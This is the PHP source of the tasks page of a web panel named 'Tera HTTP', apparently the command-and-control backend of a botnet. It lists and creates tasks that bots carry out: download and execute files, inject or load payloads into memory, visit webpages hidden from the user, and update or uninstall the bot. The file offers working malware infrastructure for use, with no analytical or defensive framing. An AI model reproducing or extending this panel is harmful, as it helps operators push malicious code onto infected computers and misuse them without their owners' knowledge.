<?php
include "../inc/botstats.php";



						if (isset($_GET['act']))
						{
							if (!isset($_GET['id']))
							{
								echo '<div class="alert alert-danger">No task ID specified. Reloading...</div><meta http-equiv="refresh" content="2;url=?p=tasks">';
							}else{
								$act = $_GET['act'];
								$tid = $_GET['id'];
								if (ctype_digit($tid))
								{
									if (ctype_alnum($act))
									{
										$arr = array('pause', 'resume', 'restart', 'delete');
										if (in_array($act, $arr))
										{
											$cnt = $odb->prepare("SELECT COUNT(*) FROM tasks WHERE id = :i");
											$cnt->execute(array(":i" => $tid));
											if ($cnt->fetchColumn(0) > 0)
											{
												$cre = $odb->prepare("SELECT username FROM tasks WHERE id = :i");
												$cre->execute(array(":i" => $tid));
												$cr = $cre->fetchColumn(0);
												$cpermss = $odb->prepare("SELECT privileges FROM users WHERE username = :u");
												$cpermss->execute(array(":u" => $cr));
												$cperms = $cpermss->fetchColumn(0);
												if ($userperms == "moderator" && $cperms == "admin")
												{
													echo '<div class="alert alert-danger">You cannot manage tasks created by administrators.</div>';
												}else{
													if ($userperms == "user" && strtolower($cr) != strtolower($username))
													{
														echo '<div class="alert alert-danger">You cannot manage tasks created by other users.</div>';
													}else{
														switch ($act)
														{
															case "pause":
																$up = $odb->prepare("UPDATE tasks SET status = '2' WHERE id = :i LIMIT 1");
																$up->execute(array(":i" => $tid));
																$in = $odb->prepare("INSERT INTO plogs VALUES(NULL, :u, :ip, :r, UNIX_TIMESTAMP())");
																$in->execute(array(":u" => $username, ":ip" => $_SERVER['REMOTE_ADDR'], ":r" => 'Paused task #'.$tid));
																echo '<div class="alert alert-success">Task has been paused. Reloading...</div><meta http-equiv="refresh" content="2;url=?p=tasks">';
																break;
															case "resume":
																$up = $odb->prepare("UPDATE tasks SET status = '1' WHERE id = :i LIMIT 1");
																$up->execute(array(":i" => $tid));
																$in = $odb->prepare("INSERT INTO plogs VALUES(NULL, :u, :ip, :r, UNIX_TIMESTAMP())");
																$in->execute(array(":u" => $username, ":ip" => $_SERVER['REMOTE_ADDR'], ":r" => 'Resumed task #'.$tid));
																echo '<div class="alert alert-success">Task has been resumed. Reloading...</div><meta http-equiv="refresh" content="2;url=?p=tasks">';
																break;
															case "restart":
																$de = $odb->prepare("DELETE FROM tasks_completed WHERE taskid = :i");
																$de->execute(array(":i" => $tid));
																$in = $odb->prepare("INSERT INTO plogs VALUES(NULL, :u, :ip, :r, UNIX_TIMESTAMP())");
																$in->execute(array(":u" => $username, ":ip" => $_SERVER['REMOTE_ADDR'], ":r" => 'Restarted task #'.$tid));
																echo '<div class="alert alert-success">Task successfully restarted. Reloading...</div><meta http-equiv="refresh" content="2;url=?p=tasks">';
																break;
															case "delete":
																$de = $odb->prepare("DELETE FROM tasks_completed WHERE taskid = :i");
																$de->execute(array(":i" => $tid));
																$da = $odb->prepare("DELETE FROM tasks WHERE id = :i");
																$da->execute(array(":i" => $tid));
																$in = $odb->prepare("INSERT INTO plogs VALUES(NULL, :u, :ip, :r, UNIX_TIMESTAMP())");
																$in->execute(array(":u" => $username, ":ip" => $_SERVER['REMOTE_ADDR'], ":r" => 'Deleted task #'.$tid));
																echo '<div class="alert alert-success">Task successfully deleted. Reloading...</div><meta http-equiv="refresh" content="2;url=?p=tasks">';
																break;
														}
													}
												}
											}else{
												echo '<div class="alert alert-danger">Task not found in database. Reloading...</div><meta http-equiv="refresh" content="2;url=?p=tasks">';
											}
										}else{
											echo '<div class="alert alert-danger">Invalid task action. Reloading...</div><meta http-equiv="refresh" content="2;url=?p=tasks">';
										}
									}else{
										echo '<div class="alert alert-danger">Task action was not alpha-numeric. Reloading...</div><meta http-equiv="refresh" content="2;url=?p=tasks">';
									}
								}else{
									echo '<div class="alert alert-danger">Task ID was not a digit. Reloading...</div><meta http-equiv="refresh" content="2;url=?p=tasks">';
								}
							}
						}
						if (isset($_POST['addTask']))
						{
							$task = $_POST['task'];
							$params = base64_encode($_POST['params']);
							if ($params == "" || $params == NULL)
							{
								$params = base64_encode("None");
							}
							$filters = base64_encode($_POST['filter']);
							if ($filters == "" || $filters == NULL)
							{
								$filters = base64_encode("None");
							}
							$exs = $_POST['execs'];
							if (ctype_digit($task))
							{
								if (ctype_digit($exs) || $exs == "" || $exs == NULL)
								{
									if ($exs == "" || $exs == NULL)
									{
										$exs = "unlimited";
									}
									if ($task == "9" || $task == "10")
									{
										if ($userperms != "admin")
										{
											echo '<div class="alert alert-danger">You do not have permission to use this command.</div>';
										}else{
											$i = $odb->prepare("INSERT INTO tasks VALUES(NULL, :t, :p, :f, :e, :u, '1', UNIX_TIMESTAMP())");
											$i->execute(array(":t" => $task, ":p" => $params, ":f" => $filters, ":e" => $exs, ":u" => $username));
											$i2 = $odb->prepare("INSERT INTO plogs VALUES(NULL, :u, :ip, :r, UNIX_TIMESTAMP())");
											$i2->execute(array(":u" => $username, ":ip" => $_SERVER['REMOTE_ADDR'], ":r" => 'Created task #'.$odb->query("SELECT id FROM tasks ORDER BY id DESC LIMIT 1")->fetchColumn(0)));
											echo '<div class="alert alert-success">Task successfully created. Reloading...</div><meta http-equiv="refresh" content="2">';
										}
									}else{
										$i = $odb->prepare("INSERT INTO tasks VALUES(NULL, :t, :p, :f, :e, :u, '1', UNIX_TIMESTAMP())");
										$i->execute(array(":t" => $task, ":p" => $params, ":f" => $filters, ":e" => $exs, ":u" => $username));
										$i2 = $odb->prepare("INSERT INTO plogs VALUES(NULL, :u, :ip, :r, UNIX_TIMESTAMP())");
										$i2->execute(array(":u" => $username, ":ip" => $_SERVER['REMOTE_ADDR'], ":r" => 'Created task #'.$odb->query("SELECT id FROM tasks ORDER BY id DESC LIMIT 1")->fetchColumn(0)));
										echo '<div class="alert alert-success">Task successfully created. Reloading...</div><meta http-equiv="refresh" content="2">';
									}
								}else{
									echo '<div class="alert alert-danger">Invalid number of executions.</div>';
								}
							}else{
								echo '<div class="alert alert-danger">Task type was not a digit.</div>';
							}
						}
						?>
<!DOCTYPE html>
<html lang="en">

<head>

  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="description" content="">
  <meta name="author" content="">

  <title>Tera HTTP</title>

  <!-- Bootstrap Core CSS -->
   <link href="../vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">

    <!-- MetisMenu CSS -->
    <link href="../vendor/metisMenu/metisMenu.min.css" rel="stylesheet">

    <!-- DataTables CSS -->
    <link href="../vendor/datatables-plugins/dataTables.bootstrap.css" rel="stylesheet">

    <!-- DataTables Responsive CSS -->
    <link href="../vendor/datatables-responsive/dataTables.responsive.css" rel="stylesheet">

    <!-- Custom CSS -->
    <link href="../dist/css/sb-admin-2.css" rel="stylesheet">

    <!-- Custom Fonts -->
    <link href="../vendor/font-awesome/css/font-awesome.min.css" rel="stylesheet" type="text/css">
</head>

<body>

  <div id="wrapper">

    <!-- Navigation -->
    <nav class="navbar navbar-default navbar-static-top" role="navigation" style="margin-bottom: 0">
      <div class="navbar-header">
        <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
                    <span class="sr-only">Toggle navigation</span>
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                </button>
        <a class="navbar-brand" href="index.html">Tera HTTP</a>
      </div>
      <!-- /.navbar-header -->

      <ul class="nav navbar-top-links navbar-right">

        <!-- /.dropdown -->
        <li class="dropdown">
          <a class="dropdown-toggle" data-toggle="dropdown" href="#">
                        <i class="fa fa-user fa-fw"></i> <i class="fa fa-caret-down"></i>
                    </a>
          <ul class="dropdown-menu dropdown-user">
            <li><a href="settings.php"><i class="fa fa-gear fa-fw"></i> Settings</a>
            </li>
            <li class="divider"></li>
            <li><a href="logout.php"><i class="fa fa-sign-out fa-fw"></i> Logout</a>
            </li>
          </ul>
          <!-- /.dropdown-user -->
        </li>
        <!-- /.dropdown -->
      </ul>
      <!-- /.navbar-top-links -->

      <div class="navbar-default sidebar" role="navigation">
        <div class="sidebar-nav navbar-collapse">
          <ul class="nav" id="side-menu">
            <li class="sidebar-search">
              <div class="input-group custom-search-form">
                <input type="text" class="form-control" placeholder="Search...">
                <span class="input-group-btn">
                                <button class="btn btn-default" type="button">
                                    <i class="fa fa-search"></i>
                                </button>
                            </span>
              </div>
              <!-- /input-group -->
            </li>
             <li>
              <a href="index.php"><i class="fa fa-dashboard fa-fw"></i> Dashboard</a>
            </li>

            </li>
            <li>
              <a href="bots.php"><i class="fa fa-table fa-fw"></i> Bots</a>
            </li>
            <li>
              <a href="statistics.php"><i class="fa fa-th-list"></i> Statistics</a>
            </li>
            <li>
              <a href="tasks.php"><i class="fa fa-edit fa-fw"></i> Tasks </a>
            </li>
             <li>
              <a href="settings.php"><i class="fa fa-gears"></i> Settings </a>
            </li>


            <!-- /.nav-second-level -->
            </li>

          </ul>
        </div>
        <!-- /.sidebar-collapse -->
      </div>
      <!-- /.navbar-static-side -->
    </nav>

    <div id="page-wrapper">
<br>
      <br>
       <div class="col-lg-12 col-xs-12">
	<div class="panel panel-default">
		<div class="panel-heading">
			Tasks
		</div>
						<table id="currenttasks" class="table table-striped table-bordered table-hover">
							<thead>
								<tr>
									<th>#</th>
									<th>User</th>
									<th>Type</th>
									<th>Parameters</th>
									<th>Filter</th>
									<th>Executions</th>
									<th>Date Created</th>
									<th>Status</th>
									<th>Actions</th>
								</tr>
							</thead>
							<tbody>
								<?php
								$tasks = $odb->query("SELECT * FROM tasks");
								while ($t = $tasks->fetch(PDO::FETCH_ASSOC))
								{
									$execs = $odb->prepare("SELECT COUNT(*) FROM tasks_completed WHERE taskid = :i");
									$execs->execute(array(":i" => $t['id']));
									$ex = $execs->fetchColumn(0);
									$tsk = "";
																		switch ($t['task'])
									{
										case "1":
											$tsk = "Download & Execute";
											break;
										case "2":
											$tsk = "Download & Execute (Inject)";
											break;
										case "3":
											$tsk = "Download & Execute (W/ Command Line Arguments)";
											break;
										case "4":
											$tsk = "Visit Webpage (Visible)";
											break;
										case "5":
											$tsk = "Visit Webpage (Hidden)";
											break;
										case "9":
											$tsk = "Update";
											break;
										case "10":
											$tsk = "Uninstall";
											break;
									}
									$st = "";
									if ($t['status'] == "1")
									{
										if ($ex == $t['executions'])
										{
											$st = '<small class="badge bg-green">Completed</small>';
										}else{
											$st = '<small class="badge bg-yellow">Running</small>';
										}
									}else{
										$st = '<small class="badge bg-red">Paused</small>';
									}
									$actions = "<center>";
									if ($t['status'] == "1")
									{
										$actions .= '<a href="?p=tasks&id='.$t['id'].'&act=pause" title="Pause Task"><i class="fa fa-pause"></i></a>&nbsp;';
									}else{
										$actions .= '<a href="?p=tasks&id='.$t['id'].'&act=resume" title="Resume Task"><i class="fa fa-play"></i></a>&nbsp;';
									}
									if ($t['executions'] != "unlimited")
									{
										if ($ex == $t['executions'])
										{
											$actions .= '<a href="?p=tasks&id='.$t['id'].'&act=restart" title="Restart Task"><i class="fa fa-undo"></i></a>&nbsp;';
										}
									}
									$actions .= '<a href="?p=tasks&id='.$t['id'].'&act=delete" title="Delete Task"><i class="fa fa-times-circle"></i></a></center>';
									echo '<tr><td>'.$t['id'].'</td><td>'.$t['username'].'</td><td>'.$tsk.'</td><td>'.base64_decode($t['params']).'</td><td>'.base64_decode($t['filters']).'</td><td>'.$ex.'/'.$t['executions'].'</td><td data-order="'.$t['date'].'">'.date("m-d-Y, h:i A", $t['date']).'</td><td>'.$st.'</td><td>'.$actions.'</td></tr>';
								}
								?>
							</tbody>
						</table>
						<hr>
					</div>
         <div class="panel panel-default">
                        <div class="panel-heading">
								<h4>Add Task</h4>
								<br>
								<form action="" method="POST" class="col-lg-8">
									<label>Task Type</label>
									<select name="task" class="form-control">
										<optgroup label="Downloads">
											<option value="1">Load</option>
											<option value="2">Load to memory</option>
										</optgroup>
										<optgroup label="Webpages">
											<option value="4">Visit Webpage (Visible)</option>
											<option value="5">Visit Webpage (Hidden)</option>
										</optgroup>
										<?php
										if ($userperms == "admin")
										{
											echo '<optgroup label="Bot Management">
													<option value="9">Update</option>
													<option value="10">Uninstall</option>
												</optgroup>';
										}
										?>
									</select>
									<br>
									<label>Params</label>
									<input type="text" class="form-control" name="params" placeholder="">
									<br>
                  <label>Filters</label>
									<input type="text" class="form-control" name="filter" placeholder="Leave blank for no filter(s)">
									<br>
									<label>Number of Executions</label>
									<input type="text" class="form-control" name="execs" placeholder="blank = unlimited">
									<br>
									<center><input type="submit" class="btn btn-primary" name="addTask" value="Add New Task"></center>
								</form>
								<div class="clearfix"></div>
							</div>
      
      

				</div>
			</section>
		</aside>
	</div>
	
        
        
        <!-- /.col-lg-12 -->
      </div>
      






              <!-- /.table-responsive -->
            
            <!-- /.panel-body -->
     
          <!-- /.panel -->

    </div>
    <!-- /.col-lg-4 -->
  </div>
  <!-- /.row -->
  </div>
  <!-- /#page-wrapper -->

  </div>
  <!-- /#wrapper -->

  <!-- jQuery -->
<script src="../vendor/jquery/jquery.min.js"></script>

    <!-- Bootstrap Core JavaScript -->
    <script src="../vendor/bootstrap/js/bootstrap.min.js"></script>

    <!-- Metis Menu Plugin JavaScript -->
    <script src="../vendor/metisMenu/metisMenu.min.js"></script>

    <!-- DataTables JavaScript -->
    <script src="../vendor/datatables/js/jquery.dataTables.min.js"></script>
    <script src="../vendor/datatables-plugins/dataTables.bootstrap.min.js"></script>
    <script src="../vendor/datatables-responsive/dataTables.responsive.js"></script>

    <!-- Custom Theme JavaScript -->
    <script src="../dist/js/sb-admin-2.js"></script>


    <!-- Page-Level Demo Scripts - Tables - Use for reference -->

	<script type="text/javascript">
		$(document).ready(function() {
			$("#currenttasks").dataTable({
				"paging": false,
				"info": false,
				"filter": false,
				"order": [[6, "desc"]]
			});
		});
	</script>

</body>

</html>